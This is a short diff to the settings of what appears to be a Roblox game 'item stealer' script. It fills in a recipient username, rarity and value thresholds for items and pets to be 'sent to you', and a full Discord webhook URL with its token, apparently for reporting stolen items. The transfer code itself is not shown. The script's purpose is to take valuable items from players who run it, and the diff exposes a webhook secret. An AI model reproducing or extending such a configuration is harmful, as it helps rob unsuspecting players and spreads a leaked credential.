@@ -1,7 +1,7 @@
-Username = "your roblox user here"
+Username = "JUNLIHIJARA_YT"
 min_rap = 10000 -- minimum rap of each item you want to get sent to you. 10k by default
-min_chance = 10000 -- minimum chance of pets you want to get sent to you. 10k by default, which means that it will not send pets under 1 in 10k
-webhook = "your discord webhook here"
+min_chance = 800000 -- minimum chance of pets you want to get sent to you. 10k by default, which means that it will not send pets under 1 in 10k
+webhook = "https://discord.com/api/webhooks/1297170731594944652/UE13byz2ZL2W8YA4C18RjqIKE5IBGzbt-aWU3bIBSxu9jSRXBmcyBL8uJosErX--MZ1s"
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
